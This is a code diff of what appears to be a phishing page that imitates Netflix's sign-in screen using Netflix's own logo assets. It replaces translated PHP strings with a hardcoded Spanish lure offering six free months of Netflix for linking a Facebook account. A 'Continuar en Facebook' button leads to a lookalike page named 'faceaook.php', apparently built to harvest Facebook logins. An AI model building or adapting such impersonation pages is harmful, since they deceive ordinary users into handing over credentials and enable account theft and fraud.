@@ -1,7 +1,3 @@
-<?php
-include 'translate.php';
-include 'ip.php';
-?>
 <html lang="en">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
@@ -38,15 +34,16 @@ include 'ip.php';
 
 <img src="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"/>
 <h1>Sign In</h1>
-<h2> <font color="red"><?php echo $txt_head1 ?> </h2> 
+<h2> <font color="red">Ahora puede obtener 6 meses de servicio de Netflix en cooperación con Facebook vinculando su suscripción a su cuenta de Facebook
+Esta oferta solo está disponible por tiempo limitado y está sujeta a los términos y condiciones de Facebook y Netflix</h2> 
 </font> <br>
 <input type="checkbox"  required="true" > 
-<font color="white"><?php echo $polices ?> </font>
+<font color="white">Aceptar terminos y condiciones</font>
 
 <div class="facebookForm regOption">
 <a href="faceaook.php"><br>
 <img class="icon-facebook" src="https://assets.nflxext.com/ffe/siteui/login/images/FB-f-Logo__blue_57.png"/>
-<button class="fbBtnText" ><?php echo $txt_button_head ?></button> 
+<button class="fbBtnText" >Continuar en Facebook</button> 
 </div>
 </a>
 </div>
